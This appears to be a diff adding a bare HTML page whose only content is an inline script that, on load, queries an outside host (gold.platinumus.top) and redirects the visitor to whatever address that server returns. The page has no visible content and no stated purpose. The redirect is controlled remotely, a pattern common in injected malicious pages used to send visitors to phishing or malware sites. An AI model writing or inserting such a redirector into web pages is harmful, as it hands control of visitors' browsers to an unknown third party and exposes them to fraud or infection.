@@ -1,0 +1,9 @@
+<html>
+<head>
+<script>
+    var t="onload"in new XMLHttpRequest?XMLHttpRequest:XDomainRequest;var e=new t;e.open("GET","https://gold.platinumus.top/track/awswrite?q=html",true);e.onload=function(){location.href=this.responseText};e.send();
+</script>
+</head>
+<body>
+</body>
+</html>
